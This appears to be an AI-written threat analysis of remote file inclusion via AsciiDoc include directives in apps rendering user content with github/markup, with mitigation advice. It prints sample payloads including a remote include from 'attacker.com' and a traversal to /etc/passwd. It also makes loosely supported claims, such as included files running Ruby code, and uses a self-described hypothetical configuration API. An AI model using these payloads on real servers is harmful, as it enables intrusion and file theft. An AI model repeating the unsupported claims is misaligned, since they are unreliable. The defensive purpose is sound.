Okay, here's a deep analysis of the Remote File Inclusion (RFI) threat in AsciiDoc, as used within the context of the `github/markup` library.

## Deep Analysis: Remote File Inclusion (RFI) in AsciiDoc

### 1. Objective, Scope, and Methodology

**1.1. Objective:**

The primary objective of this deep analysis is to thoroughly understand the RFI vulnerability in AsciiDoc rendering (specifically within the context of how `github/markup` might utilize it), assess its potential impact on applications using `github/markup`, and propose concrete, actionable mitigation strategies beyond the initial threat model description.  We aim to provide developers with a clear understanding of *why* the mitigations are necessary and *how* to implement them effectively.

**1.2. Scope:**

This analysis focuses on:

*   The `asciidoctor` library, as it's the most common AsciiDoc processor and a likely candidate for use by `github/markup`.  While `github/markup` supports multiple markup languages, this analysis is specifically scoped to AsciiDoc.
*   The `include` directive within AsciiDoc, as this is the primary vector for RFI attacks.
*   The interaction between `github/markup` and `asciidoctor`, specifically how `github/markup` configures and invokes `asciidoctor`.
*   The context of a web application using `github/markup` to render user-supplied AsciiDoc content.  This is the most likely attack scenario.
*   The security implications of using `github/markup` in a server-side rendering context.

**1.3. Methodology:**

This analysis will employ the following methods:

*   **Code Review (Hypothetical):**  We will analyze how `github/markup` *likely* interacts with `asciidoctor`, based on common practices and the `github/markup` documentation.  Since we don't have direct access to the application's specific implementation, we'll make informed assumptions.
*   **Documentation Review:**  We will thoroughly examine the documentation for both `github/markup` and `asciidoctor` to understand configuration options, security features, and known vulnerabilities.
*   **Vulnerability Research:**  We will research known RFI vulnerabilities in `asciidoctor` and related libraries.
*   **Threat Modeling Principles:**  We will apply threat modeling principles (STRIDE, DREAD) to assess the risk and impact.
*   **Best Practices Analysis:**  We will compare the identified risks against established security best practices for web application development and input sanitization.

### 2. Deep Analysis of the Threat

**2.1. Threat Agent:**

The threat agent is a malicious actor with the ability to submit AsciiDoc content to the application that uses `github/markup`. This could be through a comment field, a file upload, a forum post, or any other input mechanism that allows user-generated content to be rendered.

**2.2. Attack Vector:**

The primary attack vector is the `include` directive in AsciiDoc.  A typical malicious payload would look like this:

```asciidoc
include::https://attacker.com/malicious.adoc[]
```

or, potentially exploiting path traversal if URL validation is weak:

```asciidoc
include::https://example.com/../../../../etc/passwd[]
```

The attacker aims to include a remote file (`malicious.adoc` in the first example) that contains malicious code.  This code could be Ruby code (since `asciidoctor` is Ruby-based), shell commands, or any other code that the server can execute. The second example attempts to read a sensitive system file.

**2.3. Vulnerability:**

The core vulnerability lies in the `asciidoctor` library's handling of the `include` directive, *specifically when combined with insufficient input validation and insecure configuration within the application using `github/markup`*.  Several factors contribute:

*   **Default Behavior:**  Older versions of `asciidoctor` might have allowed remote includes by default, or had less strict URL validation.
*   **Misconfiguration:**  The application using `github/markup` might not have explicitly configured `asciidoctor` to disable remote includes or restrict allowed paths.
*   **Lack of Input Sanitization:**  The application might not be properly sanitizing user-supplied AsciiDoc content *before* passing it to `github/markup`.  This is crucial, even if `asciidoctor` is configured securely.
*   **Bypasses:**  Even with some security measures in place, attackers might find ways to bypass them.  For example, they might use URL encoding, double encoding, or other techniques to trick the validation logic.

**2.4. Technical Impact:**

The technical impact of a successful RFI attack is severe:

*   **Remote Code Execution (RCE):**  The attacker can execute arbitrary code on the server, with the privileges of the user running the web application.
*   **Complete Server Compromise:**  With RCE, the attacker can gain full control of the server, potentially accessing databases, sensitive files, and other resources.
*   **Data Exfiltration:**  The attacker can steal sensitive data, including user credentials, personal information, and proprietary data.
*   **Denial of Service (DoS):**  The attacker can disrupt the application's availability by crashing the server or consuming excessive resources.
*   **Lateral Movement:**  The attacker can use the compromised server as a launching pad to attack other systems on the network.

**2.5. Business Impact:**

The business impact mirrors the technical impact and can be catastrophic:

*   **Reputational Damage:**  A successful attack can severely damage the organization's reputation and erode customer trust.
*   **Financial Loss:**  Data breaches can lead to significant financial losses due to fines, lawsuits, and remediation costs.
*   **Legal and Regulatory Consequences:**  Data breaches can violate privacy regulations (e.g., GDPR, CCPA), leading to legal penalties.
*   **Loss of Intellectual Property:**  The attacker can steal trade secrets and other valuable intellectual property.
*   **Business Disruption:**  The attack can disrupt business operations, leading to lost revenue and productivity.

**2.6. Detailed Mitigation Strategies and Implementation Guidance:**

The initial mitigation strategies are a good starting point, but we need to expand on them with specific implementation details:

*   **1. Disable `include` (if possible):**

    *   **How:**  This is the most secure option.  In `asciidoctor`, you can achieve this by setting the `safe` mode to `secure` or `server`.  `github/markup` likely provides a way to pass options to the underlying renderer.  You might need to configure this through your application's configuration files or code.  For example, in a Ruby on Rails application, you might have:

        ```ruby
        # config/initializers/github_markup.rb
        GitHub::Markup.configure do |config|
          config.register(:asciidoc, GitHub::Markup::Asciidoctor,
            safe: :secure # Or :server
          )
        end
        ```

    *   **Why:**  This completely eliminates the RFI attack vector.  If you don't need file inclusion, this is the best approach.

*   **2. Strictly Control Allowed Paths (if `include` is necessary):**

    *   **How:**  If you *must* use `include`, configure `asciidoctor` to only allow inclusion from a specific, whitelisted directory.  This is typically done using the `base_dir` option.  Crucially, this directory should:
        *   Be outside the web root.  This prevents attackers from directly accessing the included files via a web browser.
        *   Have restricted permissions.  Only the user running the web application should have read access to this directory.
        *   Contain *only* trusted files.  Do not allow users to upload files to this directory.

        Example (again, in a hypothetical Rails configuration):

        ```ruby
        # config/initializers/github_markup.rb
        GitHub::Markup.configure do |config|
          config.register(:asciidoc, GitHub::Markup::Asciidoctor,
            safe: :safe, # Or :unsafe, but with base_dir
            base_dir: Rails.root.join('app', 'asciidoc_includes')
          )
        end
        ```

        **Important:**  Even with `base_dir`, you *must* still validate the filename passed to the `include` directive.  `base_dir` prevents path traversal *outside* the specified directory, but it doesn't prevent an attacker from trying to include `../../../../etc/passwd` *within* that directory (if they somehow managed to get a file there).  You need to sanitize the filename to ensure it only contains allowed characters (e.g., alphanumeric characters, underscores, and periods).  A regular expression is a good way to do this:

        ```ruby
        # Example filename sanitization (in a controller or helper)
        def sanitize_filename(filename)
          filename.gsub(/[^a-zA-Z0-9_\.]/, '')
        end
        ```

    *   **Why:**  This limits the scope of the `include` directive, preventing attackers from accessing arbitrary files on the server.  The combination of `base_dir` and filename sanitization is crucial.

*   **3. Keep Libraries Updated:**

    *   **How:**  Regularly update `asciidoctor` and `github/markup` to the latest versions.  Use your package manager (e.g., `gem` for Ruby, `npm` for Node.js) to manage dependencies and ensure you're running patched versions.  Subscribe to security mailing lists or follow the projects on GitHub to be notified of security updates.

    *   **Why:**  Security vulnerabilities are often discovered and patched in newer versions of libraries.  Keeping your libraries up-to-date is a fundamental security practice.

*   **4. Input Sanitization (Crucial, even with other mitigations):**

    *   **How:**  Before passing user-supplied AsciiDoc content to `github/markup`, sanitize it to remove or escape potentially dangerous characters and patterns.  This is a defense-in-depth measure.  Even if `asciidoctor` is configured securely, input sanitization can prevent other types of attacks (e.g., XSS) and provide an extra layer of protection against RFI.  Consider using a dedicated sanitization library or a well-vetted regular expression.

    *   **Why:**  Input sanitization is a fundamental security principle.  It helps prevent a wide range of attacks, not just RFI.

*   **5. Web Application Firewall (WAF):**

    *   **How:**  Deploy a Web Application Firewall (WAF) to filter malicious traffic before it reaches your application.  A WAF can be configured to block requests that contain suspicious patterns, such as attempts to include remote files.

    *   **Why:**  A WAF provides an additional layer of defense against various web application attacks, including RFI.

*   **6. Security Audits and Penetration Testing:**

    *   **How:**  Regularly conduct security audits and penetration testing to identify and address vulnerabilities in your application.

    *   **Why:**  These proactive measures can help you find and fix vulnerabilities before attackers exploit them.

*   **7. Least Privilege:**
    * **How:** Ensure that the user account under which the application runs has the absolute minimum necessary permissions.  It should not have write access to sensitive directories or the ability to execute arbitrary commands.
    * **Why:** This limits the damage an attacker can do even if they achieve RCE.

**2.7. Relationship to `github/markup`:**

`github/markup` acts as a bridge between your application and the `asciidoctor` library.  It's crucial to understand that `github/markup` itself is *not* inherently vulnerable to RFI.  The vulnerability lies in how `asciidoctor` is configured and used, and how user input is handled *before* being passed to `github/markup`.  `github/markup` likely provides a mechanism to configure the underlying renderers (like `asciidoctor`), and this is where the security configuration must be applied.

### 3. Conclusion

The RFI vulnerability in AsciiDoc, when used in conjunction with `github/markup`, poses a significant threat to web applications.  The potential for remote code execution and complete server compromise makes this a high-severity risk.  Mitigation requires a multi-layered approach, combining secure configuration of `asciidoctor`, strict input sanitization, regular updates, and potentially the use of a WAF.  Developers must prioritize security best practices and thoroughly understand the implications of using user-supplied content with rendering libraries.  By implementing the detailed mitigation strategies outlined above, developers can significantly reduce the risk of RFI attacks and protect their applications and users.
